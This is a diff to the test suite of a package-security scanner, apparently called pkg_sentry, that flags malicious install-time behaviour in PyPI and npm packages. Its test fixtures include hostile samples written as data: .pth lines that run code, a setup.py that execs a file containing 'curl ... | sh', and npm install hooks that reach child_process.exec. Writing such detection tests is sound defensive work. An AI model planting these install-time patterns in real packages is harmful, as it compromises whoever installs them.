@@ -144,8 +144,23 @@ def test_secrets_and_a_way_out_in_different_files_is_not_theft():
 def test_honest_pth_files():
     nspkg = ("import sys, types, os;p = os.path.join(sys._getframe(1).f_locals['sitedir'], "
              "*('google',));importlib = __import__('importlib.util')")
-    auto = "import os; exec('try: __import__(\"x\").auto_install()\nexcept: pass')"
-    assert analyse(package({"x-nspkg.pth": nspkg, "auto.pth": auto})) == []
+    shim = ("import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local')"
+            " == 'local'; enabled and __import__('_distutils_hack').add_shim(); ")
+    assert analyse(package({"x-nspkg.pth": nspkg, "distutils-precedence.pth": shim})) == []
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "import os; __import__('payload')",
+        "import payload, os; p = os.path.join('a', 'b')",
+        "import os; os.environ.get('X') and __import__('_distutils_hack').run()",
+        "import os; [os.system][0]('id')",
+        "import os; exec('try: __import__(\"x\").auto_install()\\nexcept: pass')",
+    ],
+)
+def test_pth_lines_that_only_look_honest(line):
+    assert {"pth-code", "pth-file"} & set(rules({"x.pth": line}))
 
 
 def test_tests_folders_dont_count_decoding_tricks():
@@ -163,3 +178,89 @@ def test_several_kinds_of_credentials_plus_a_way_out_is_theft():
 def test_same_finding_is_reported_once():
     found = analyse(package({"a.py": "u = 'https://webhook.site/x'"}))
     assert len(found) == 1
+
+
+def test_files_setup_py_reads_as_code_run_at_install():
+    files = {
+        "setup.py": "exec(open('build_helpers/version.txt').read())\nfrom setuptools import setup",
+        "build_helpers/version.txt": "import os\nos.system('curl -s https://x.example/a | sh')",
+    }
+    assert {"shell-at-install", "download-exec"} <= set(rules(files))
+
+
+def test_imports_are_followed_through_several_files():
+    files = {
+        "setup.py": "import helpers\nfrom setuptools import setup",
+        "helpers/__init__.py": "from .deep import go\ngo()",
+        "helpers/deep.py": "import subprocess\ndef go():\n    subprocess.Popen('calc.exe')",
+    }
+    assert "shell-at-install" in rules(files)
+
+
+def test_in_tree_build_backend_runs_at_install():
+    files = {
+        "pyproject.toml": "[build-system]\nbackend-path = ['_build']\nbuild-backend = 'backend'",
+        "_build/backend.py": "import os\nos.system('id')",
+    }
+    assert "shell-at-install" in rules(files)
+
+
+def test_compiled_python():
+    assert rules({"pkg/__init__.py": "", "pkg/core.pyc": b"\x6f\x0d\x0d\x0a" + b"\0" * 20}) == [
+        "compiled-python"]
+    found = analyse(package({"setup.py": "import loader", "loader.pyc": b"\0" * 20}))
+    assert [(f.rule, f.points) for f in found] == [("compiled-python", 45)]
+
+
+def test_a_top_level_package_called_tools_is_the_library():
+    files = {"tools/__init__.py": "import os\nos.system('id')"}
+    assert rules(files) == ["shell-at-install"]
+    assert is_dev_file("tools/x.py")
+    assert not is_dev_file("tools/x.py", {"tools"})
+    assert not is_dev_file("src/tools/x.py", {"src/tools"})
+    assert is_dev_file("pkg/tools/x.py", {"pkg", "pkg/tools"})
+
+
+def test_code_that_couldnt_be_read_is_a_finding():
+    unpacked = Unpacked([], [("setup.py", "too big"), ("pkg/core.py", "too big"),
+                             ("README.md", "too big"), ("link.py", "symlink")], [])
+    found = {f.path: f for f in analyse(unpacked)}
+    assert set(found) == {"setup.py", "pkg/core.py"}
+    assert found["setup.py"].points == 60 and found["pkg/core.py"].points is None
+
+
+def test_a_whole_archive_that_couldnt_be_read():
+    found = analyse(Unpacked([], [("*", "too many files")], []))
+    assert [f.rule for f in found] == ["unread-code"]
+
+
+@pytest.mark.parametrize(
+    "paths, expected",
+    [
+        (["package.json", "index.js"], "npm"),
+        (["setup.py", "package.json"], "pypi"),
+        (["package.json", "x-1.0.dist-info/METADATA"], "pypi"),
+        (["pkg/__init__.py"], "pypi"),
+    ],
+)
+def test_guessing_the_ecosystem(paths, expected):
+    from pkg_sentry.analyse import guess_ecosystem
+    assert guess_ecosystem(dict.fromkeys(paths)) == expected
+
+
+def test_npm_requires_are_followed_from_install_hooks():
+    files = {
+        "package.json": json.dumps({"scripts": {"postinstall": "node install.js"}}),
+        "install.js": "require('./lib/a')",
+        "lib/a.js": "const x = require('../lib/b.js')",
+        "lib/b.js": "require('child_process').exec('whoami')",
+    }
+    assert "shell-at-install" in rules(files, "npm")
+
+
+def test_the_root_package_json_wins_over_nested_ones():
+    files = {
+        "package.json": json.dumps({"name": "x"}),
+        "node_modules/y/package.json": json.dumps({"scripts": {"install": "curl x | sh"}}),
+    }
+    assert "install-script" not in rules(files, "npm")
